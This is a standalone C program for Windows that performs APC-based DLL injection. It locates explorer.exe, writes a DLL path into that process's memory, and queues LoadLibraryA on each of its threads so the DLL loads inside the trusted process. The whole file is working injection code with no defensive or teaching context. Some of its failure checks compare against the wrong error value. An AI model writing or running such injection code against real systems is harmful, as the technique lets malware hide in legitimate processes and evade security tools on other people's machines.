#include <stdio.h>
#include <Windows.h>
#include <tchar.h>
#include <TlHelp32.h>

int _tmain(int argc, TCHAR* argv[]) {

	const char* dll_path = "DllInjection.dll";
	const wchar_t* procName = L"explorer.exe";

	HANDLE handleSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD | TH32CS_SNAPPROCESS, NULL);

	if (handleSnapshot == INVALID_HANDLE_VALUE) {
		printf("Cant create snapshot of current system");
		return 1;
	}
	
	int pid = NULL;
	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(processEntry);

	if (Process32First(handleSnapshot, &processEntry)) {
		do {
			if (wcscmp(processEntry.szExeFile, procName) == 0) {
				pid = processEntry.th32ProcessID;
				_tprintf(TEXT("Here is Your PID: %d\r\n"), pid);
				break;
			}
		} while (Process32Next(handleSnapshot, &processEntry));
	}

	if (pid == NULL) {
		_tprintf(TEXT("Process wasnt found"));
		return 1;
	}
	HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, NULL, pid);
	LPVOID ptrArg;

	if (procHandle == INVALID_HANDLE_VALUE) {
		_tprintf("INVALID_HANDLE_VALUE for process id: %d\r\n", pid);
		return 1;
	}

	// Allocate memory fot the dll path string and write the dll to the new memory
	ptrArg = VirtualAllocEx(procHandle, NULL, strlen(dll_path), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	if (WriteProcessMemory(procHandle, ptrArg, dll_path, strlen(dll_path), NULL) == 0) {
		_tprintf(TEXT("Cannot write to remote process memory \r\n"));
		return 1;
	}

	// Get LoadLibrary address
	LPVOID ptrAddr = (LPVOID)GetProcAddress(GetModuleHandle(TEXT("Kernel32.dll")), "LoadLibraryA");

	// Allocate struct for threads iterating
	THREADENTRY32 ptrThread;
	ptrThread.dwSize = sizeof(THREADENTRY32);

	if (Thread32First(handleSnapshot, &ptrThread) == TRUE) {
		// If the thread's process ids is same as the process we want to inject to
		do {
			if (ptrThread.th32OwnerProcessID == pid) {
				HANDLE handleOpenThread = OpenThread(THREAD_ALL_ACCESS, NULL, ptrThread.th32ThreadID);
				if (handleOpenThread == INVALID_HANDLE_VALUE) {
					_tprintf(TEXT("INVALID_HANDLE_VALUE for thread id: %d\r\n"), ptrThread.th32ThreadID);
				}
				// Add apc to call LoadLibrary with our process
				else if (QueueUserAPC((PAPCFUNC)ptrAddr, handleOpenThread, (ULONG_PTR)ptrArg)) {
					_tprintf(TEXT("QueueUserAPC for thread id: %d\r\n"), ptrThread.th32ThreadID);
				}
				else {
					_tprintf(TEXT("Cannot Insert to APCQueue for thread id: %d\r\n"), ptrThread.th32ThreadID);
				}
			}
		} while (Thread32Next(handleSnapshot, &ptrThread) == TRUE);
	}
	else {
		_tprintf(TEXT("Cannot get first thread \r\n"));
		return 1;
	}

	return 0;
}
